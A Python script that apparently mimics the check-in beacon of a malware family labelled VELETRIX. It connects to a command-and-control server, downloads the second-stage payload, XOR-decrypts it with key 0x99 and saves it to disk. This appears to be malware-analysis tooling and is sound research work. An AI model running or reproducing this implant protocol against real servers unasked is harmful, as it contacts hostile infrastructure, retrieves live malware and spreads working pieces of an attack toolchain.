#!/usr/bin/env python3
import socket
import struct
import sys

def construct_beacon(c2_ip):
    """
    Construct beacon packet based on the provided format:
    - "w64   " (6 bytes)
    - 0x27 0x0f (2 control bytes)
    - IP address in ASCII
    - NULL padding to complete the packet
    """
    header = b"w64   "
    
    control_bytes = b"\x27\x0f"
    
    ip_ascii = c2_ip.encode('ascii')
    
    total_size = 40
    current_size = len(header) + len(control_bytes) + len(ip_ascii)
    padding_size = total_size - current_size
    
    padding = b"\x00" * padding_size
    
    beacon = header + control_bytes + ip_ascii + padding
    
    return beacon

def xor_decrypt(encrypted_data, key=0x99):
    """
    XOR decrypt the payload with the specified key
    """
    decrypted = bytearray()
    for byte in encrypted_data:
        decrypted.append(byte ^ key)
    return bytes(decrypted)

def communicate_c2(c2_ip, c2_port, timeout=10):
    try:
        print(f"[*] Connecting to C2: {c2_ip}:{c2_port}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        sock.connect((c2_ip, c2_port))
        print(f"[+] Connected to C2 server")
        
        beacon = construct_beacon(c2_ip)
        print(f"[*] Sending beacon ({len(beacon)} bytes)")
        print(f"[*] Beacon hex: {beacon.hex()}")
        
        sock.send(beacon)
        print(f"[+] Beacon sent successfully")
        
        print(f"[*] Waiting for 2nd stage payload...")
        encrypted_payload = b""
        
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                encrypted_payload += data
            except socket.timeout:
                print(f"[*] Timeout - assuming payload complete")
                break
        
        sock.close()
        
        if not encrypted_payload:
            print(f"[-] No payload received from C2")
            return False
            
        print(f"[+] Total payload received: {len(encrypted_payload)} bytes")
        
        print(f"[*] Decrypting payload with XOR key 0x99")
        decrypted_payload = xor_decrypt(encrypted_payload)
        
        output_file = "2nd-stage.bin"
        with open(output_file, 'wb') as f:
            f.write(decrypted_payload)
        
        print(f"[+] Decrypted {len(encrypted_payload)} bytes")
        print(f"[+] Saved to: {output_file}")
        
        if len(decrypted_payload) >= 16:
            print(f"[+] First 16 bytes: {decrypted_payload[:16].hex()}")
            
            if decrypted_payload[:2] == b'MZ':
                print("[+] Detected PE file signature!")
            elif decrypted_payload[:4] == b'\x7fELF':
                print("[+] Detected ELF file signature!")
            elif decrypted_payload[:4] == b'\xcf\xfa\xed\xfe':
                print("[+] Detected Mach-O file signature!")
        
        return True
        
    except socket.error as e:
        print(f"[-] Socket error: {e}")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 c2_beacon.py <C2_IP> <C2_PORT>")
        print("Example: python3 c2_beacon.py 192.168.1.100 8080")
        sys.exit(1)
    
    c2_ip = sys.argv[1]
    c2_port = int(sys.argv[2])
    
    print(f"[*] China-Nexus VELETRIX 2nd Stage Extraction")
    print(f"[*] Target: {c2_ip}:{c2_port}")
    print("-" * 50)
    
    success = communicate_c2(c2_ip, c2_port)
    
    if success:
        print("[+] Operation completed successfully")
    else:
        print("[-] Operation failed")
        sys.exit(1)

if __name__ == "__main__":
    main()